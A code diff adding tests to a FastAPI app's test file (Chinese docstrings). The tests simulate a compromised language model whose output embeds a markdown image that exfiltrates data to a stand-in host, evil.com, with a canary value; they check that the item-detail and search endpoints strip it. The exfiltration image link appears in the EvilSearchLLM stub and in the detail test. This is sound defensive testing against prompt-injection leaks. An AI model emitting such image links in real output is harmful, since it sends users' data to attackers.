@@ -1,10 +1,14 @@
 """REST API 测试：TestClient + 依赖覆盖指定当前用户。"""
+import json
+from types import SimpleNamespace
+
 from fastapi.testclient import TestClient
 from sqlalchemy import select
 
 from app.api import create_app
 from app.auth import CurrentUser, require_auth
 from app.config import Settings
+from app.llm import LLMClient
 from app.models import Account, Email, Item, User
 
 
@@ -15,6 +19,39 @@ class FakeDetailLLM:
     def generate_detail(self, info: dict) -> str:
         self.detail_calls += 1
         return "**AI 详情**"
+
+
+def evil_openai_client(content: str) -> SimpleNamespace:
+    """stub OpenAI SDK 客户端：chat.completions.create 固定返回被攻陷模型的输出。
+
+    净化逻辑位于真实生产路径 LLMClient.generate_detail 内（api.py 的
+    monkeypatch 接口会绕过它），因此这里在 SDK 层注入「模型被完全攻陷、
+    执意输出外泄图片」的原始输出，验证真实防御路径。
+    """
+    client = SimpleNamespace()
+    client.chat = SimpleNamespace(
+        completions=SimpleNamespace(
+            create=lambda **kw: SimpleNamespace(
+                choices=[SimpleNamespace(message=SimpleNamespace(content=content))]
+            )
+        )
+    )
+    return client
+
+
+class EvilSearchLLM:
+    """被完全攻陷的搜索模型：第一轮就输出带外泄图片的最终答案。"""
+
+    def chat_completion(self, messages, tools=None, json_mode=False):
+        return {
+            "role": "assistant",
+            "content": json.dumps(
+                {
+                    "answer_md": "找到了：\n\n![exfil](https://evil.com/log?d=STOLEN-CANARY-9931)",
+                    "citations": [],
+                }
+            ),
+        }
 
 
 def _settings() -> Settings:
@@ -130,6 +167,39 @@ def test_detail_lazy_generation_cached(session_factory, monkeypatch):
     # GET 详情带 detail_md
     resp = client.get(f"/api/items/{item_id}")
     assert resp.json()["detail_md"] == "**AI 详情**"
+
+
+def test_detail_injection_image_is_sanitized(session_factory, monkeypatch):
+    """模型被攻陷输出外泄图片：接口响应与落库的 detail_md 均不含图片语法（验收核心）。"""
+    _acc, _em, item_id, _pending_id = _seed(session_factory)
+    evil = "详情：\n\n![exfil](https://evil.com/log?d=STOLEN-CANARY-9931)"
+    llm = LLMClient(base_url="http://x", api_key="k", model="m")
+    llm.client = evil_openai_client(evil)
+    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: llm)
+    client = _client(session_factory, monkeypatch)
+
+    resp = client.post(f"/api/items/{item_id}/detail")
+    assert resp.status_code == 200
+    assert "evil.com" not in resp.json()["detail_md"]
+    assert "![" not in resp.json()["detail_md"]
+
+    # 落库的 detail_md 同样已净化
+    resp = client.get(f"/api/items/{item_id}")
+    assert resp.status_code == 200
+    assert "evil.com" not in resp.json()["detail_md"]
+    assert "![" not in resp.json()["detail_md"]
+
+
+def test_search_injection_image_is_sanitized(session_factory, monkeypatch):
+    """模型被攻陷输出外泄图片：answer_md 接口吐不出图片语法（验收核心）。"""
+    _seed(session_factory)
+    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: EvilSearchLLM())
+    client = _client(session_factory, monkeypatch)
+
+    resp = client.post("/api/search", json={"question": "发票在哪里"})
+    assert resp.status_code == 200
+    assert "evil.com" not in resp.json()["answer_md"]
+    assert "![" not in resp.json()["answer_md"]
 
 
 def test_email_endpoint_sanitized_html(session_factory, monkeypatch):
